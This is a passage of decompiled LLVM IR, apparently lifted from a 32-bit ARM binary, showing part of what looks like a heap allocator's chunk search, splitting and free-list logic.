  store i32 %v2_13cec, i32* %r1.global-to-local, align 4
  %v2_13cf0 = and i32 %v5_13ce0, %v6_13ccc
  store i32 %v2_13cf0, i32* %r2.global-to-local, align 4
  %v2_13cf4 = or i32 %v2_13cf0, %v2_13cec
  store i32 %v2_13cf4, i32* %r3.global-to-local, align 4
  %v4_13cf4 = icmp eq i32 %v2_13cf4, 0
  br i1 %v4_13cf4, label %dec_label_pc_13e28, label %dec_label_pc_13cfc.preheader

dec_label_pc_13cfc.preheader:                     ; preds = %bb64, %dec_label_pc_13ce0.loopexit
  %v2_13cf078 = phi i32 [ %v2_13cf0, %dec_label_pc_13ce0.loopexit ], [ %v2_13cf073, %bb64 ]
  %v2_13cec77 = phi i32 [ %v2_13cec, %dec_label_pc_13ce0.loopexit ], [ %v2_13cec72, %bb64 ]
  br label %dec_label_pc_13cfc

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cfc.preheader, %dec_label_pc_13e00
  %v0_13d04 = phi i32 [ %v2_13e1c, %dec_label_pc_13e00 ], [ %v2_13cf078, %dec_label_pc_13cfc.preheader ]
  %v0_13f7c = phi i32 [ %v2_13e18, %dec_label_pc_13e00 ], [ %v2_13cec77, %dec_label_pc_13cfc.preheader ]
  store i32 %v0_13f7c, i32* %r3.global-to-local, align 4
  %v2_13cfc = icmp eq i32 %v0_13f7c, 0
  br i1 %v2_13cfc, label %dec_label_pc_13d04, label %dec_label_pc_13f7c

dec_label_pc_13d04:                               ; preds = %dec_label_pc_13cfc
  %v1_13d04 = sub i32 0, %v0_13d04
  %v2_13d08 = and i32 %v0_13d04, %v1_13d04
  store i32 %v2_13d08, i32* %r0.global-to-local, align 4
  %v3_13d18 = mul i32 %v2_13d08, 1088
  store i32 %v3_13d18, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19f86.576 to i32), i32* %r2.global-to-local, align 4
  %v2_13d4c = mul i32 %v2_13d08, 124511785
  store i32 %v2_13d4c, i32* %r3.global-to-local, align 4
  %v4_13d50 = udiv i32 %v2_13d4c, 134217728
  %v5_13d50 = add i32 %v4_13d50, ptrtoint (i32* @global_var_19f86.576 to i32)
  %v6_13d50 = inttoptr i32 %v5_13d50 to i8*
  %v7_13d50 = load i8, i8* %v6_13d50, align 1
  %v9_13d50 = zext i8 %v7_13d50 to i32
  store i32 %v9_13d50, i32* %r1.global-to-local, align 4
  %v1_13d54 = add nuw nsw i32 %v9_13d50, 32
  br label %dec_label_pc_13d58

dec_label_pc_13d58:                               ; preds = %dec_label_pc_13f7c, %dec_label_pc_13d04
  %storemerge = phi i32 [ %v1_13d54, %dec_label_pc_13d04 ], [ %v9_13fc8, %dec_label_pc_13f7c ]
  store i32 %storemerge, i32* @r8, align 4
  %v3_13d58 = load i32, i32* @global_var_22ae8.558, align 4
  store i32 %v3_13d58, i32* %r2.global-to-local, align 4
  %v3_13d5c = mul nsw i32 %storemerge, 16
  store i32 %v3_13d5c, i32* @r6, align 4
  %v1_13d60 = or i32 %v3_13d5c, 8
  store i32 %v1_13d60, i32* %r3.global-to-local, align 4
  %v2_13d64 = icmp eq i32 %v3_13d58, 0
  store i1 %v2_13d64, i1* @cpsr_z, align 1
  %v1_13d68 = load i32, i32* @sl, align 4
  %v2_13d68 = add i32 %v1_13d68, %v1_13d60
  store i32 %v2_13d68, i32* @r5, align 4
  br i1 %v2_13d64, label %dec_label_pc_13d70, label %dec_label_pc_13f54

dec_label_pc_13d70.loopexit:                      ; preds = %dec_label_pc_13f78
  %v0_13d70.pre = load i32, i32* @r8, align 4
  %v0_13d74.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d70.loopexit, %dec_label_pc_13d58
  %v0_13d74 = phi i32 [ %v0_13d74.pre, %dec_label_pc_13d70.loopexit ], [ %v1_13d68, %dec_label_pc_13d58 ]
  %v0_14098 = phi i32 [ %v0_13d70.pre, %dec_label_pc_13d70.loopexit ], [ %storemerge, %dec_label_pc_13d58 ]
  %v1_13d70 = add i32 %v0_14098, 1
  store i32 %v1_13d70, i32* %r1.global-to-local, align 4
  %v4_13d74 = mul i32 %v1_13d70, 16
  %v5_13d74 = add i32 %v4_13d74, %v0_13d74
  %v6_13d74 = inttoptr i32 %v5_13d74 to i32*
  %v7_13d74 = load i32, i32* %v6_13d74, align 4
  store i32 %v7_13d74, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @r0, align 4
  %v2_13d7c = icmp eq i32 %v7_13d74, 0
  br i1 %v2_13d7c, label %.thread7, label %dec_label_pc_13d98

.thread7:                                         ; preds = %dec_label_pc_13d70
  %v4_13d80 = mul i32 %v1_13d70, 16
  %v3_13d84 = add i32 %v4_13d80, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v3_13d84, i32* %r3.global-to-local, align 4
  %v2_13d88 = add i32 %v4_13d80, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8)
  store i32 %v2_13d88, i32* %r2.global-to-local, align 4
  %v7_13d8c = add i32 %v4_13d74, ptrtoint (i32* @global_var_223b8.560 to i32)
  %v8_13d8c = inttoptr i32 %v7_13d8c to i32*
  store i32 %v2_13d88, i32* %v8_13d8c, align 4
  %v1_13d90 = load i32, i32* %r2.global-to-local, align 4
  %v2_13d90 = load i32, i32* %r3.global-to-local, align 4
  %v3_13d90 = add i32 %v2_13d90, 4
  %v4_13d90 = inttoptr i32 %v3_13d90 to i32*
  store i32 %v1_13d90, i32* %v4_13d90, align 4
  %v1_13db0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13dac

dec_label_pc_13d98:                               ; preds = %dec_label_pc_13d70
  %v1_13da0 = add i32 %v4_13d74, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8)
  store i32 %v1_13da0, i32* %r3.global-to-local, align 4
  %v9_13da4 = icmp eq i32 %v7_13d74, %v1_13da0
  br i1 %v9_13da4, label %dec_label_pc_13dac, label %dec_label_pc_14098

dec_label_pc_13dac:                               ; preds = %.thread7, %dec_label_pc_13d98
  %v1_13db0 = phi i32 [ %v1_13db0.pre, %.thread7 ], [ %v0_13d74, %dec_label_pc_13d98 ]
  %v0_13dac = load i32, i32* @r6, align 4
  %v1_13dac = add i32 %v0_13dac, 8
  store i32 %v1_13dac, i32* %r2.global-to-local, align 4
  %v2_13db0 = add i32 %v1_13db0, %v1_13dac
  %v3_13db0 = inttoptr i32 %v2_13db0 to i32*
  %v4_13db0 = load i32, i32* %v3_13db0, align 4
  store i32 %v4_13db0, i32* %r3.global-to-local, align 4
  %v2_13db4 = icmp eq i32 %v4_13db0, 0
  store i1 %v2_13db4, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_13db0, i32* %r4.global-to-local, align 4
  br i1 %v2_13db4, label %dec_label_pc_13ce0.loopexit, label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13dac
  %v0_13dc4 = call i32 @function_15c98()
  store i32 %v0_13dc4, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13dcc = load i32, i32* %r2.global-to-local, align 4
  %v2_13dcc = load i32, i32* %r1.global-to-local, align 4
  %v3_13dcc = add i32 %v2_13dcc, %v1_13dcc
  %v4_13dcc = inttoptr i32 %v3_13dcc to i32*
  store i32 0, i32* %v4_13dcc, align 4
  %v0_13dd0 = call i32 @function_15c98()
  store i32 %v0_13dd0, i32* %r0.global-to-local, align 4
  %v0_13dd4 = load i32, i32* @r6, align 4
  %v1_13dd4 = add i32 %v0_13dd4, 12
  store i32 %v1_13dd4, i32* %r3.global-to-local, align 4
  %v1_13dd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13dd8 = add i32 %v1_13dd8, %v1_13dd4
  %v3_13dd8 = inttoptr i32 %v2_13dd8 to i32*
  %v4_13dd8 = load i32, i32* %v3_13dd8, align 4
  store i32 %v4_13dd8, i32* %r2.global-to-local, align 4
  %v2_13ddc = icmp eq i32 %v4_13dd8, 0
  br i1 %v2_13ddc, label %dec_label_pc_13ce0.loopexit, label %dec_label_pc_13de4

dec_label_pc_13de4:                               ; preds = %dec_label_pc_13dc4
  store i32 240, i32* @r7, align 4
  %v0_13de8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13de8, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_13dfc = icmp eq i32 %v0_13de8, -38
  br i1 %v4_13dfc, label %dec_label_pc_13e00, label %dec_label_pc_13ce0.loopexit

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13de4
  store i32 -38, i32* %r0.global-to-local, align 4
  %v2_13e0c = load i32, i32* @global_var_223b8.560, align 4
  %v5_13e0c = load i32, i32* @global_var_223bc.562, align 4
  store i32 %v5_13e0c, i32* @r4, align 4
  %v2_13e18 = and i32 %v2_13e0c, %v1_13cc8
  store i32 %v2_13e18, i32* %r1.global-to-local, align 4
  %v2_13e1c = and i32 %v5_13e0c, %v6_13ccc
  store i32 %v2_13e1c, i32* %r2.global-to-local, align 4
  %v2_13e20 = or i32 %v2_13e1c, %v2_13e18
  store i32 %v2_13e20, i32* %r3.global-to-local, align 4
  %v4_13e20 = icmp eq i32 %v2_13e20, 0
  br i1 %v4_13e20, label %dec_label_pc_13e28, label %dec_label_pc_13cfc

dec_label_pc_13e28:                               ; preds = %bb64, %dec_label_pc_13ce0.loopexit, %dec_label_pc_13e00
  %v3_13e28 = load i32, i32* @global_var_22ae8.558, align 4
  store i32 %v3_13e28, i32* %r3.global-to-local, align 4
  store i32 %v0_1406c, i32* %ip.global-to-local, align 4
  %v2_13e30 = icmp eq i32 %v3_13e28, 0
  store i1 %v2_13e30, i1* @cpsr_z, align 1
  %v1_13e34 = add i32 %v0_1406c, 16
  store i32 %v1_13e34, i32* %r2.global-to-local, align 4
  store i32 %v1_13e34, i32* %stack_var_-44, align 4
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* @r6, align 4
  br i1 %v2_13e30, label %dec_label_pc_13e44, label %dec_label_pc_13fec

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13fd0, %dec_label_pc_13e28
  %v2_13e44 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_13e44, i32* %r0.global-to-local, align 4
  %v2_13e48 = call i32 @function_16b44(i32* nonnull %stack_var_-44)
  store i32 %v2_13e48, i32* @r0, align 4
  store i32 %v2_13e48, i32* %r4.global-to-local, align 4
  %v2_13e4c = icmp eq i32 %v2_13e48, 0
  br i1 %v2_13e4c, label %dec_label_pc_141dc, label %dec_label_pc_13e54

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e44
  store i32 ptrtoint (i32* @global_var_223a8.580 to i32), i32* @r0, align 4
  %v2_13e58 = load i32, i32* @global_var_223a8.580, align 4
  store i32 %v2_13e58, i32* %r3.global-to-local, align 4
  %v9_13e5c = icmp eq i32 %v2_13e48, %v2_13e58
  br i1 %v9_13e5c, label %dec_label_pc_13e7c, label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e54
  %v3_13e64 = load i32, i32* %stack_var_-44, align 4
  %v1_13e68 = add i32 %v2_13e48, 16
  store i32 %v1_13e68, i32* %r4.global-to-local, align 4
  %v1_13e6c = add i32 %v3_13e64, -16
  store i32 %v1_13e6c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 %v1_13e6c, i32* %stack_var_-44, align 4
  %v2_13e78 = add i32 %v2_13e48, 8
  %v3_13e78 = inttoptr i32 %v2_13e78 to i32*
  store i32 1, i32* %v3_13e78, align 4
  %v0_13e80.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e7c

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e54, %dec_label_pc_13e64
  %v0_13e80 = phi i32 [ %v2_13e48, %dec_label_pc_13e54 ], [ %v0_13e80.pre, %dec_label_pc_13e64 ]
  %v3_13e7c = load i32, i32* %stack_var_-44, align 4
  %v1_13e80 = add i32 %v0_13e80, -8
  store i32 %v1_13e80, i32* @r5, align 4
  %v1_13e84 = or i32 %v3_13e7c, 1
  store i32 %v1_13e84, i32* %r1.global-to-local, align 4
  %v2_13e88 = add i32 %v3_13e7c, %v0_13e80
  store i32 %v2_13e88, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  %v1_13e90 = add i32 %v2_13e88, -8
  %v2_13e90 = inttoptr i32 %v1_13e90 to i32*
  store i32 %v1_13e84, i32* %v2_13e90, align 4
  %v4_13e90 = add i32 %v2_13e88, -4
  %v5_13e90 = inttoptr i32 %v4_13e90 to i32*
  %v6_13e90 = load i32, i32* @r4, align 4
  store i32 %v6_13e90, i32* %v5_13e90, align 4
  %v0_13e94 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e94 = load i32, i32* @r5, align 4
  %v2_13e94 = add i32 %v1_13e94, 4
  %v3_13e94 = inttoptr i32 %v2_13e94 to i32*
  store i32 %v0_13e94, i32* %v3_13e94, align 4
  %v2_13e98 = load i32, i32* @global_var_223ac.578, align 4
  store i32 %v2_13e98, i32* %r2.global-to-local, align 4
  %v2_13e9c = icmp eq i32 %v2_13e98, 0
  store i1 %v2_13e9c, i1* @cpsr_z, align 1
  %v0_13ea0 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ea0 = load i32, i32* @r0, align 4
  %v2_13ea0 = inttoptr i32 %v1_13ea0 to i32*
  store i32 %v0_13ea0, i32* %v2_13ea0, align 4
  br i1 %v2_13e9c, label %dec_label_pc_13ec4, label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e7c
  %v0_13ea8 = call i32 @function_15c98()
  store i32 %v0_13ea8, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13eb0 = load i32, i32* @r6, align 4
  %v2_13eb0 = inttoptr i32 %v1_13eb0 to i32*
  store i32 0, i32* %v2_13eb0, align 4
  %v0_13eb4 = call i32 @function_15c98()
  store i32 %v0_13eb4, i32* %r0.global-to-local, align 4
  %v3_13eb8 = load i32, i32* @global_var_223b0.581, align 4
  store i32 %v3_13eb8, i32* %r3.global-to-local, align 4
  %v2_13ebc = icmp eq i32 %v3_13eb8, 0
  br i1 %v2_13ebc, label %dec_label_pc_13ec4, label %dec_label_pc_1418c

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13ea8, %dec_label_pc_1418c, %dec_label_pc_13e7c, %dec_label_pc_141a8
  %v0_13ec4 = load i32, i32* @r5, align 4
  store i32 %v0_13ec4, i32* %r0.global-to-local, align 4
  %v1_13ec8 = inttoptr i32 %v0_13ec4 to i32*
  %v2_13ec8 = call i32 @function_13260(i32* %v1_13ec8)
  store i32 %v2_13ec8, i32* %r0.global-to-local, align 4
  %v2_13ecc = icmp eq i32 %v2_13ec8, 0
  %v1_13ed0 = load i32, i32* @r5, align 4
  br i1 %v2_13ecc, label %bb65, label %dec_label_pc_13ed8

bb65:                                             ; preds = %dec_label_pc_13ec4
  store i32 %v1_13ed0, i32* @r8, align 4
  br label %dec_label_pc_13f08

dec_label_pc_13ed8:                               ; preds = %dec_label_pc_13ec4
  %v1_13ed8 = inttoptr i32 %v1_13ed0 to i32*
  %v2_13ed8 = load i32, i32* %v1_13ed8, align 4
  %v1_13edc = and i32 %v2_13ed8, -2
  %v2_13ee0 = sub i32 %v1_13ed0, %v1_13edc
  store i32 %v2_13ee0, i32* %r3.global-to-local, align 4
  %v1_13ee4 = add i32 %v2_13ee0, 4
  %v2_13ee4 = inttoptr i32 %v1_13ee4 to i32*
  %v3_13ee4 = load i32, i32* %v2_13ee4, align 4
  store i32 %v3_13ee4, i32* %r1.global-to-local, align 4
  %v1_13ee8 = add i32 %v1_13ed0, 4
  %v2_13ee8 = inttoptr i32 %v1_13ee8 to i32*
  %v3_13ee8 = load i32, i32* %v2_13ee8, align 4
  store i32 %v3_13ee8, i32* %r2.global-to-local, align 4
  %v1_13eec = and i32 %v3_13ee4, -2
  %v2_13ef0 = add i32 %v3_13ee8, %v1_13eec
  store i32 %v2_13ef0, i32* %r1.global-to-local, align 4
  store i32 %v2_13ef0, i32* %v2_13ee4, align 4
  %v0_13ef8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ef8 = and i32 %v0_13ef8, -2
  store i32 %v1_13ef8, i32* %r2.global-to-local, align 4
  %v0_13efc = load i32, i32* %r1.global-to-local, align 4
  %v1_13efc = load i32, i32* @r5, align 4
  %v3_13efc = add i32 %v1_13efc, %v1_13ef8
  %v4_13efc = inttoptr i32 %v3_13efc to i32*
  store i32 %v0_13efc, i32* %v4_13efc, align 4
  %v0_13f00 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13f00, i32* @r8, align 4
  store i32 %v0_13f00, i32* @r5, align 4
  br label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %bb65, %dec_label_pc_14160, %dec_label_pc_14140, %dec_label_pc_14128, %dec_label_pc_1417c, %dec_label_pc_13ed8
  %v0_13f08 = load i32, i32* @r5, align 4
  %v1_13f08 = add i32 %v0_13f08, 4
  %v2_13f08 = inttoptr i32 %v1_13f08 to i32*
  %v3_13f08 = load i32, i32* %v2_13f08, align 4
  %v1_13f0c = and i32 %v3_13f08, -2
  store i32 %v1_13f0c, i32* %r1.global-to-local, align 4
  store i32 %v0_1406c, i32* @r3, align 4
  %v1_13f14 = add i32 %v1_13f0c, -16
  store i32 %v1_13f14, i32* %r2.global-to-local, align 4
  %v3_13f18 = icmp ult i32 %v0_1406c, %v1_13f14
  br i1 %v3_13f18, label %dec_label_pc_14068, label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %dec_label_pc_13f08, %dec_label_pc_14068
  %v0_13f20 = load i32, i32* @r8, align 4
  %v1_13f20 = add i32 %v0_13f20, 8
  store i32 %v1_13f20, i32* @ip, align 4
  br label %dec_label_pc_13f24

dec_label_pc_13f24:                               ; preds = %.thread14, %dec_label_pc_14348, %dec_label_pc_14300, %dec_label_pc_141e8, %dec_label_pc_13f20
  %v0_13f24 = load i32, i32* @ip, align 4
  store i32 %v0_13f24, i32* %r0.global-to-local, align 4
  store i32 %v3_13c7c, i32* @r4, align 4
  store i32 %v6_13c7c, i32* @r5, align 4
  store i32 %v9_13c7c, i32* @r6, align 4
  store i32 %v12_13c7c, i32* @r7, align 4
  store i32 %v15_13c7c, i32* @r8, align 4
  store i32 %v18_13c7c, i32* @sb, align 4
  store i32 %v21_13c7c, i32* @sl, align 4
  store i32 %v24_13c7c, i32* @fp, align 4
  ret i32 %v0_13f24

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f78
  %v0_13f3c = load i32, i32* @r6, align 4
  %v1_13f3c = add i32 %v0_13f3c, 12
  store i32 1, i32* @r2, align 4
  %v1_13f44 = load i32, i32* @sl, align 4
  %v2_13f44 = add i32 %v1_13f3c, %v1_13f44
  store i32 %v2_13f44, i32* %r1.global-to-local, align 4
  %v0_13f48 = load i32, i32* @r5, align 4
  store i32 %v0_13f48, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v2_13f50 = inttoptr i32 %v0_13f48 to i32*
  %v3_13f50 = call i32 @function_15818(i32* %v2_13f50, i32 %v2_13f44)
  store i32 %v3_13f50, i32* %r0.global-to-local, align 4
  %v0_13f54.pre = load i32, i32* @r6, align 4
  %v1_13f58.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13d58, %dec_label_pc_13f3c
  %v1_13f58 = phi i32 [ %v1_13f58.pre, %dec_label_pc_13f3c ], [ %v1_13d68, %dec_label_pc_13d58 ]
  %v0_13f54 = phi i32 [ %v0_13f54.pre, %dec_label_pc_13f3c ], [ %v3_13d5c, %dec_label_pc_13d58 ]
  %v1_13f54 = add i32 %v0_13f54, 8
  store i32 %v1_13f54, i32* %r3.global-to-local, align 4
  %v2_13f58 = add i32 %v1_13f54, %v1_13f58
  store i32 %v2_13f58, i32* @r4, align 4
  br label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge, %dec_label_pc_13f54
  %v0_13f5c = phi i32 [ %v0_13f5c.pre, %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge ], [ %v2_13f58, %dec_label_pc_13f54 ]
  %v1_13f5c = inttoptr i32 %v0_13f5c to i32*
  %v2_13f5c = load i32, i32* %v1_13f5c, align 4
  store i32 %v2_13f5c, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_13f5c, i32* %r0.global-to-local, align 4
  store i32 %v0_13f5c, i32* %r2.global-to-local, align 4
  %v4_13f6c = call i32 @function_15cec(i32 %v2_13f5c, i32 1, i32* %v1_13f5c)
  store i32 %v4_13f6c, i32* %r0.global-to-local, align 4
  %v2_13f70 = icmp eq i32 %v4_13f6c, 0
  store i1 %v2_13f70, i1* @cpsr_z, align 1
  br i1 %v2_13f70, label %dec_label_pc_13f78, label %dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge

dec_label_pc_13f5c.dec_label_pc_13f5c_crit_edge:  ; preds = %dec_label_pc_13f5c
  %v0_13f5c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13f5c

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f5c
  %v0_13f34 = load i32, i32* @r7, align 4
  %v2_13f34 = icmp eq i32 %v0_13f34, 0
  br i1 %v2_13f34, label %dec_label_pc_13d70.loopexit, label %dec_label_pc_13f3c

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13cfc
  %v1_13f7c = sub i32 0, %v0_13f7c
  %v2_13f80 = and i32 %v0_13f7c, %v1_13f7c
  store i32 %v2_13f80, i32* %r0.global-to-local, align 4
  %v3_13f90 = mul i32 %v2_13f80, 1088
  store i32 %v3_13f90, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19f86.576 to i32), i32* %r3.global-to-local, align 4
  %v2_13fc4 = mul i32 %v2_13f80, 124511785
  store i32 %v2_13fc4, i32* %r2.global-to-local, align 4
  %v4_13fc8 = udiv i32 %v2_13fc4, 134217728
  %v5_13fc8 = add i32 %v4_13fc8, ptrtoint (i32* @global_var_19f86.576 to i32)
  %v6_13fc8 = inttoptr i32 %v5_13fc8 to i8*
  %v7_13fc8 = load i8, i8* %v6_13fc8, align 1
  %v9_13fc8 = zext i8 %v7_13fc8 to i32
  br label %dec_label_pc_13d58

dec_label_pc_13fd0:                               ; preds = %dec_label_pc_14008, %dec_label_pc_13fec
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v0_13fd8 = load i32, i32* @r4, align 4
  %v2_13fd8 = icmp eq i32 %v0_13fd8, 0
  store i32 ptrtoint (i32* @global_var_223b0.581 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  br i1 %v2_13fd8, label %dec_label_pc_13e44, label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fd0
  %v3_13fe8 = call i32 @function_15818(i32* nonnull @global_var_223ac.578, i32 ptrtoint (i32* @global_var_223b0.581 to i32))
  store i32 %v3_13fe8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %dec_label_pc_14008, %dec_label_pc_13fe8, %dec_label_pc_13e28
  %v2_13fec = load i32, i32* @global_var_223ac.578, align 4
  store i32 %v2_13fec, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_13fec, i32* %r0.global-to-local, align 4
  %v4_13ffc = call i32 @function_15cec(i32 %v2_13fec, i32 1, i32* nonnull @global_var_223ac.578)
  store i32 %v4_13ffc, i32* %r0.global-to-local, align 4
  %v2_14000 = icmp eq i32 %v4_13ffc, 0
  store i1 %v2_14000, i1* @cpsr_z, align 1
  br i1 %v2_14000, label %dec_label_pc_13fd0, label %dec_label_pc_14008

dec_label_pc_14008:                               ; preds = %dec_label_pc_13fec
  %v2_14008 = load i32, i32* @global_var_223ac.578, align 4
  store i32 %v2_14008, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223ac.578 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_14008, i32* %r0.global-to-local, align 4
  %v4_14018 = call i32 @function_15cec(i32 %v2_14008, i32 1, i32* nonnull @global_var_223ac.578)
  store i32 %v4_14018, i32* %r0.global-to-local, align 4
  %v2_1401c = icmp eq i32 %v4_14018, 0
  store i1 %v2_1401c, i1* @cpsr_z, align 1
  br i1 %v2_1401c, label %dec_label_pc_13fd0, label %dec_label_pc_13fec

dec_label_pc_14028:                               ; preds = %dec_label_pc_13c7c
  %v1_14028 = add i32 %v0_13c88, 23
  %v1_1402c = and i32 %v1_14028, -16
  store i32 %v1_1402c, i32* %r3.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_1402c, 114688
  br i1 %tmp80, label %dec_label_pc_142a0, label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14028
  %v3_1403c = udiv i32 %v1_14028, 16
  store i32 %v3_1403c, i32* %r3.global-to-local, align 4
  %v1_14040 = add nsw i32 %v3_1403c, -1
  store i32 %v1_14040, i32* @r0, align 4
  %tmp81 = icmp ult i32 %v1_14040, 33
  br i1 %tmp81, label %.thread43, label %dec_label_pc_14050

.thread43:                                        ; preds = %dec_label_pc_1403c
  store i32 %v1_14040, i32* @sb, align 4
  br label %dec_label_pc_13cac

dec_label_pc_14050:                               ; preds = %dec_label_pc_1403c
  %v0_14050 = call i32 @function_17570()
  %v1_14058 = add i32 %v0_14050, 2097151
  %v3_1405c = udiv i32 %v1_14058, 2097152
  store i32 %v3_1405c, i32* %r0.global-to-local, align 4
  %v1_14060 = add nsw i32 %v3_1405c, -496
  store i32 %v1_14060, i32* @sb, align 4
  br label %dec_label_pc_13cac

dec_label_pc_14068:                               ; preds = %dec_label_pc_13f08
  store i32 %v0_1406c, i32* %ip.global-to-local, align 4
  %v2_1406c = sub i32 %v1_13f0c, %v0_1406c
  %v1_14070 = or i32 %v2_1406c, 1
  store i32 %v1_14070, i32* @r3, align 4
  %v1_14074 = load i32, i32* @r8, align 4
  %v2_14074 = add i32 %v1_14074, %v0_1406c
  store i32 %v2_14074, i32* %r0.global-to-local, align 4
  %v1_14078 = or i32 %v0_1406c, 1
  store i32 %v1_14078, i32* @r2, align 4
  %v2_1407c = add i32 %v2_14074, 4
  %v3_1407c = inttoptr i32 %v2_1407c to i32*
  store i32 %v1_14070, i32* %v3_1407c, align 4
  %v0_14080 = load i32, i32* @r2, align 4
  %v1_14080 = load i32, i32* %ip.global-to-local, align 4
  %v2_14080 = load i32, i32* @r8, align 4
  %v3_14080 = add i32 %v2_14080, %v1_14080
  %v4_14080 = inttoptr i32 %v3_14080 to i32*
  store i32 %v0_14080, i32* %v4_14080, align 4
  %v0_14084 = load i32, i32* @r2, align 4
  %v1_14084 = load i32, i32* @r5, align 4
  %v2_14084 = add i32 %v1_14084, 4
  %v3_14084 = inttoptr i32 %v2_14084 to i32*
  store i32 %v0_14084, i32* %v3_14084, align 4
  %v0_14088 = load i32, i32* @r3, align 4
  %v1_14088 = load i32, i32* %r1.global-to-local, align 4
  %v2_14088 = load i32, i32* @r8, align 4
  %v3_14088 = add i32 %v2_14088, %v1_14088
  %v4_14088 = inttoptr i32 %v3_14088 to i32*
  store i32 %v0_14088, i32* %v4_14088, align 4
  %v0_1408c = load i32, i32* %r0.global-to-local, align 4
  %v1_1408c = add i32 %v0_1408c, 8
  store i32 %v1_1408c, i32* %r0.global-to-local, align 4
  %v1_14090 = call i32 @function_13780(i32 %v1_1408c)
  store i32 %v1_14090, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f20

dec_label_pc_14098:                               ; preds = %dec_label_pc_13d98
  %v1_14098 = add i32 %v0_14098, -39
  %v3_14098 = sub i32 38, %v0_14098
  %v4_14098 = and i32 %v3_14098, %v0_14098
  %v5_14098 = icmp slt i32 %v4_14098, 0
  %v6_14098 = icmp slt i32 %v1_14098, 0
  %v7_14098 = icmp eq i32 %v0_14098, 39
  %v3_1409c = xor i1 %v6_14098, %v5_14098
  %v4_1409c = or i1 %v7_14098, %v3_1409c
  br i1 %v4_1409c, label %dec_label_pc_140ec, label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %dec_label_pc_14098
  %v0_140a0 = load i32, i32* @sb, align 4
  %v1_140a0 = add i32 %v0_140a0, 3
  store i32 %v1_140a0, i32* %r3.global-to-local, align 4
  %v2_140a4 = sub i32 %v1_140a0, %v0_14098
  %v4_140a4 = xor i32 %v1_140a0, %v0_14098
  %v5_140a4 = xor i32 %v2_140a4, %v1_140a0
  %v6_140a4 = and i32 %v5_140a4, %v4_140a4
  %v7_140a4 = icmp slt i32 %v6_140a4, 0
  %v8_140a4 = icmp slt i32 %v2_140a4, 0
  %v9_140a4 = icmp eq i32 %v1_140a0, %v0_14098
  %v3_140a8 = xor i1 %v8_140a4, %v7_140a4
  %v4_140a8 = or i1 %v9_140a4, %v3_140a8
  br i1 %v4_140a8, label %dec_label_pc_140ac, label %dec_label_pc_141b8

dec_label_pc_140ac:                               ; preds = %dec_label_pc_140a0
  %v1_140ac = add i32 %v7_13d74, 4
